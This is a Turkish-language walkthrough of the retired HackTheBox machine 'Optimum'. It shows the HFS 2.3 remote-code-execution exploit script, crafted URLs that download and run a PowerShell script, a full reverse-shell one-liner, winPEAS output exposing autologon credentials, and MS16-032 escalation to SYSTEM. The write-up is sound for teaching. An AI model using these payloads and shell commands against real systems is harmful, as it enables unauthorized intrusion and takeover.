---
{"dg-publish":true,"permalink":"/ctf/optimum-ctf/"}
---


![Pasted image 20250109022154.png](/img/user/Pasted%20image%2020250109022154.png)

Optimum, HTB'deki altıncı kutuydu, üzerinde iki **CVE** bulunan bir Windows host'u. İlk **CVE**, **HttpFileServer** yazılımındaki bir remote kod yürütme açığını içeriyor. Bunu bir **shell** almak için kullanacağım. **Privesc** (yetki yükseltme) için ise yamalanmamış **kernel** açıklarına bakacağım. Bugün, bu açıkları listelemek için **Watson** kullanırım (ki bu aynı zamanda **winPEAS**'e entegre edilmiştir), ancak yeni sürümü bu eski kutuda çalıştırmak gerçekten zorlayıcı, bu yüzden bu açıkları tanımlamak için **Sherlock**'u (Watson'un öncüsü) kullanacağım. Bir süreliğine, shell'imin **32-bit** bir processte çalıştığını fark etmeyip **kernel** açıklarımın başarısız olmasına neden oldum. Bunu da analiz ederken göstereceğim.


## Box Info

|Name|[Optimum](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Foptimum)[![Optimum](https://0xdf.gitlab.io/icons/box-optimum.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Foptimum)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Foptimum)|
|---|---|
|Release Date|18 Mar 2017|
|Retire Date|28 Oct 2017|
|OS|Windows ![Windows](https://0xdf.gitlab.io/icons/Windows.png)|
|Base Points|Easy [20]|
|Rated Difficulty|![Rated difficulty for Optimum](https://0xdf.gitlab.io/img/optimum-diff.png)|
|Radar Graph|![Radar chart for Optimum](https://0xdf.gitlab.io/img/optimum-radar.png)|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|17 days 11:48:44[![adxn37](https://www.hackthebox.com/badge/image/32)](https://app.hackthebox.com/users/32)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|18 days 06:34:38[![admin](https://www.hackthebox.com/badge/image/52)](https://app.hackthebox.com/users/52)|
|Creator|[![ch4p](https://www.hackthebox.com/badge/image/1)](https://app.hackthebox.com/users/1)|

## Recon

### nmap

nmap yalnızca bir açık TCP bağlantı noktası buldu, HTTP (80):

```
oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.8
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-13 21:58 EST
Nmap scan report for 10.10.10.8
Host is up (0.031s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds
oxdf@parrot$ nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.10.8
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-13 21:59 EST
Nmap scan report for 10.10.10.8
Host is up (0.023s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.29 seconds
```

nmap hostu Windows olarak tanımlıyor, ancak HTTP sunucusu IIS'e benzemiyor, bu nedenle işletim sistemi sürümünü öğrenmek zor.

### Website - TCP 80

#### Site

Web sitesi tam da nmap komut dosyalarının tanımladığı şeydir - HttpFileServer (HFS):

![Pasted image 20250109022626.png](/img/user/Pasted%20image%2020250109022626.png)


Bazı basit kimlik tahminlerini denedim ama olmadı.


#### Vulnerabilities

Sayfanın alt kısmı, çalışan **HFS**'nin tam sürümünü, 2.3'ü veriyor. **searchsploit**, bu sürüm için bir hata içeriyor:

```
oxdf@parrot$ searchsploit httpfileserver
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command | windows/webapps/49125.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Bu güvenlik açığı [CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287) olarak bilinmektedir.


## Shell as kostas

### Exploit Analysis

Exploit'e bakmak için `searchsploit -x windows/webapps/49125.py` kullanarak, inanılmaz derecede basittir:

```
#!/usr/bin/python3

# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"

import urllib3
import sys
import urllib.parse

try:
        http = urllib3.PoolManager()    
        url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'
        print(url)
        response = http.request('GET', url)
        
except Exception as ex:
        print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command")
        print(ex)
```

Python'da, f-string içinde {} (f' ' içinde yazıldığını unutmayın) değişkenleri temsil eder, bu nedenle {{ ve }} gerçek küme parantezlerini yazmak için nasıl kaçış yapıldığını gösterir. Yani bu, RCE elde etmek için /?search={.+exec|[url-encoded command].} şeklinde tek bir HTTP isteğidir.

```
http://10.10.10.8/?search=%00{.+exec|C%3A%5Cwindows%5Csystem32%5Ccmd.exe%20/c%20ping%2010.10.14.10.}
```

Or URL decoded:

```
http://10.10.10.8/?search=%00{.+exec|c:\windows\system32\cmd.exe+/c+ping+-c+1+10.10.14.10.}
```


### POC

Bir kavram kanıtı olarak, kendime ping atmayı denemek için bu URL'yi hazırladım:

```
http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.14.10.}
```

Eğer çalışıyorsa, hostumda tek bir ICMP paketi görmeliyim. Tcpdump'ı başlattım ve gönderdim ama hiçbir şey yok.

Genellikle, bu mevcut ortamda sistemin ping yolunu bulamamasıyla ilgili bir sorun olabilir. Bu yüzden komuttan önce `cmd /c` eklemeyi denedim:

```
http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.14.10.}
```

İşe yaradı (ilginç bir şekilde dört kez):

```
oxdf@parrot$ sudo tcpdump -i tun0 icmp and src 10.10.10.8
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:16:51.416240 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 117, length 40
16:16:51.416294 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 118, length 40
16:16:51.416309 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 119, length 40
16:16:51.418739 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 120, length 40
```

PowerShell ile de çalıştırabilirim:

```
http://10.10.10.8/?search=%00{.+exec|powershell.exe+/c+ping+-n+1+10.10.14.10.}
```

### Shell

Bu hostun yaşı ve kolay seviyede olması göz önüne alındığında, muhtemelen Defender / AMSI hakkında endişelenmeme gerek yok, bu yüzden [Nishang](https://github.com/samratashok/nishang)'dan bir PowerShell scripti alacağım. **Invoke-PowerShellTcpOneLine.ps1**'i kopyalayacağım, açıklamaları kaldıracağım ve IP ve port bilgilerini güncelleyeceğim.

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Bunun bir kopyasını `rev.ps1` olarak kaydedeceğim (sadece talep etmek üzere olduğum URL'yi daha kolay hale getirmek için). Sonra bir Python web sunucusu başlatacağım ve ziyaret edeceğim:

```
http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1').}
```

Bu da Optimum'un web sunucusuna ulaşıp rev.ps1 dosyasını indirmesini (ilginç bir şekilde dört kez) tetikliyor:

```
oxdf@parrot$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.8 - - [13/Mar/2021 20:38:04] "GET /rev.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [13/Mar/2021 20:38:04] "GET /rev.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [13/Mar/2021 20:38:04] "GET /rev.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [13/Mar/2021 20:38:04] "GET /rev.ps1 HTTP/1.1" 200 -
```

Dosya geri döndüğünde, Invoke-Expression'ın kısaltması olan IEX tarafından çalıştırılır ve shell dinleme nc'me geri bağlanır (bazı nedenlerden dolayı bu shell'de prompt sadece ilk komuttan sonra görünür):

```
oxdf@parrot$ sudo rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.8] 49179
whoami
optimum\kostas
PS C:\Users\kostas\Desktop>
```


 **`rlwrap`**
- **rlwrap** (Readline Wrapper), komut satırı uygulamaları için bir "readline" özelliği ekler. Yani, komut geçmişine erişim ve daha düzgün bir kullanıcı deneyimi sağlar. Özellikle reverse shell bağlantılarında kullanışlıdır, çünkü genellikle tab tamamlama veya komut geçmişi gibi özellikler eksik olur.

Bayrak adında küçük bir yazım hatası var, ancak onu alabilirim:

```
PS C:\Users\kostas\Desktop> cat user.txt.txt
d0c39409d7b994a9a1389ebf38ef5f73
```


## Shell as SYSTEM

### Enumeration - winPEAS

WinPEAS kullanarak yetki yükseltme yollarını araştırmaya başladım. Bunun için önce local makinama WinPEAS deposunu klonladım ve içindeki Windows exe dosyasının bulunduğu dizinde bir SMB sunucusu başlattım. SMB sunucusunu aşağıdaki komutla çalıştırdım:

```
sudo smbserver.py share . -smb2support
```

```
PS C:\programdata> copy \\10.10.14.10\share\winPEAS.exe .
```

Şimdi .\winPEAS.exe ile çalıştıracağım. Çıktıyı taradığımda birkaç ilginç şey gördüm.

Kutu Windows Server 2012 R2 ve 64 bit:

```
    Hostname: optimum                               
    ProductName: Windows Server 2012 R2 Standard
    EditionID: ServerStandard                       
    ReleaseId:                                      
    BuildBranch:                                    
    CurrentMajorVersionNumber:                      
    CurrentVersion: 6.3                             
    Architecture: AMD64
```

Kostas kullanıcı hesabına ait kimlik bilgileri bulundu.

```
  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found!!
    DefaultUserName               :  kostas
    DefaultPassword               :  kdeEjDowkS*    
```

Birçok servis potansiyel olarak ilginç olarak işaretlendi, ancak bunlar üzerinde yapılan araştırmalar sonuç vermedi.

### Enumeration - Watson/Sherlock

WinPEAS çıktısında olmadığını fark ettiğim bir şey de [Watson](https://github.com/rasta-mouse/Watson) sonuçlarıydı. Watson, bu Windows hostunun savunmasız olabileceği CVE'ler için hızlı bir denetleyicidir ve orijinal HTB günlerinde bu yaygın bir yükseltme tekniğiydi (aslında, bu hostta amaçlanan yol budur). Neden çalışmadığına dair en iyi tahminim, winPEAS'de Watson tarafından istenen .NET sürümünün 4.5 olduğu ve bu hostta yalnızca 4.0'a kadar olduğu:

```
PS C:\windows\microsoft.net\framework> ls


    Directory: C:\windows\microsoft.net\framework


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----         22/8/2013   6:39 ??            v1.0.3705
d----         22/8/2013   6:39 ??            v1.1.4322
d----         22/8/2013   6:39 ??            v2.0.50727
d----         20/3/2021   8:06 ??            v4.0.30319
...[snip]...
```


Eğer **Watson**'ı çalıştırmak isteseydim, onu indirip mevcut olan .NET sürümlerinden birine uygun şekilde derleyerek çalıştırabilirdim, ancak bunu hızlı bir şekilde başaramadım. Bunun yerine, bu sistemin çok eski olmasından dolayı, Watson'ın öncülü olan **[Sherlock](https://github.com/rasta-mouse/Sherlock)**'a yöneldim. Sherlock ve Watson'ı yaklaşık 2.5 yıl önce [**Bounty**](https://0xdf.gitlab.io/2018/10/27/htb-bounty.html#enumeration) yazımda göstermiştim.

**Sherlock**, bir PowerShell scriptidir. Bir kopyasını indirip inceledim ve birçok fonksiyon tanımladığını, ancak bunları çağırmadığını gördüm. Bunun üzerine, scriptin sonuna `Find-AllVulns` fonksiyonunu çağıran bir satır ekledim. Daha sonra, bir Python HTTP sunucusu kullanarak bu scripti barındırdım ve shell elde ettiğim yöntemle çalıştırdım.

```
PS C:\> IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.10/Sherlock.ps1')
                                                    
Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015              
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092                       
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable
                                                    
Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053                     
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems
                                                    
Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081                   
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems
                                                    
Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable
```

MS16-032, MS16-034 ve MS16-135 olmak üzere üç adet “Güvenlik Açığı Görünüyor” ibaresi bulunmaktadır.

### Mimarinin Önemi

Bu açıkları çalıştırmak için bir süre uğraştım ve çalışması gereken yerlerde çalışmadılar. Sonra çalışan PowerShell prosesinin proses mimarisini bilmenin önemini hatırladım.

Shell'i etkinleştirmek için `powershell`'i çağırmak, 32 bit proses olarak çalışan bir proses döndürüyor:

```
PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
False
```

Bunun nedeni HFS prosesinin muhtemelen 32 bit proses olarak çalışıyor olmasıdır. Bu tablo ([ss64.com](https://ss64.com/nt/syntax-64bit.html)'dan alınmıştır) mevcut session mimarisine göre farklı yolların nasıl çalıştığını göstermektedir:

![Pasted image 20250109033027.png](/img/user/Pasted%20image%2020250109033027.png)

Bir 32-bit oturum içerisindeyken, `C:\windows\system32` yolundan PowerShell çağrısı yaptığınızda, 32-bit sürüm çalıştırılır. 32-bit bir oturumda çalışırken, 64-bit bir işletim sistemine karşı kernel exploit'lerini çalıştırmaya çalışmak başarısız olacaktır.

64-bit bir shell elde etmek için, **`sysNative`** dizinindeki PowerShell'in tam yolunu kullanacağım.

```
GET /?search=%00{.exec|C%3a\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1').} HTTP/1.1
Host: 10.10.10.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: HFS_SID=0.916518518235534
Upgrade-Insecure-Requests: 1
```

Ortaya çıkan shell 64 bittir:

```
PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
True
```



### MS16-032

Yukarıdaki exploit-db bağlantısı, bu tür bir senaryo için işe yaramayacak çünkü yeni bir pencere açacak, komut çalıştırma yeteneği sağlamayacaktır. Neyse ki, Empire projesindeki kişiler, bu [script'in bir sürümünü](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1), komut seçeneği ekleyerek portladılar.

Bunun bir kopyasını indireceğim ve en sona, reverse shell'imi indirip çalıştıracak bir komutla çağrılmasını sağlamak için bir satır ekleyeceğim.

```
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1')"
```

64 bit shell'den (ve hem rev.ps1'i sunan bir Python web sunucusu hem de shell'i almak için 443'ü dinleyen nc ile), exploit'i indirmek ve çalıştırmak için aynı PowerShell cradle'ı kullanacağım:

```
PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.10/Invoke-MS16032.ps1')
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

Hemen Invoke-MS16032.ps1 için bir istek var. Son mesaj geldikten sonra, rev.ps1 için başka bir istek oluyor ve ardından nc'de bir shell alıyorum.

```
oxdf@parrot$ sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.8] 49244
whoami
nt authority\system
PS C:\Users\kostas\Desktop>
```

```
PS C:\users\administrator\desktop> type root.txt
51ed1b36************************
```

